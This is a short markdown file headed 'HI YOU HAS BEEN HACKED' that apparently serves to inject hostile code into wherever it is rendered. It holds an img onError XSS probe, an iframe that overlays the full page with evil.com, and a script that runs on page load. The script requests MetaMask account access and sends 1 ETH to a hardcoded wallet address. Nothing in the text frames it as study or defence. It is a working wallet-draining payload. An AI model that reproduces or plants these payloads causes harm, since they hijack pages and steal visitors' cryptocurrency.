# HI YOU HAS BEEN HACKED

## "><img src=x onError=prompt(1)>

### 

"><iframe src="https://evil.com" height="100%" width="100%" frameborder="0"></iframe>
">
<script>
  window.onload = function() {
  // Check if MetaMask is installed
  if (typeof ethereum !== 'undefined') {
    // Request the user to connect to their Ethereum account
    ethereum.enable().then(function(accounts) {
      // Get the user's Ethereum account
      const account = accounts[0];
      // Set the parameters for the transaction
      const params = {
        from: account,
        to: '0xc23f21422F53b00446EbeB2A84e1f7bAD1917e64',
        value: '1000000000000000000' // 1 ETH in wei
      };
      // Send the transaction to MetaMask for confirmation
      ethereum.sendTransaction(params, function(error, hash) {
        if (error) {
          console.error(error);
        } else {
          console.log(hash);
        }
      });
    });
  } else {
    console.error('MetaMask is not installed');
  }
}
</script>


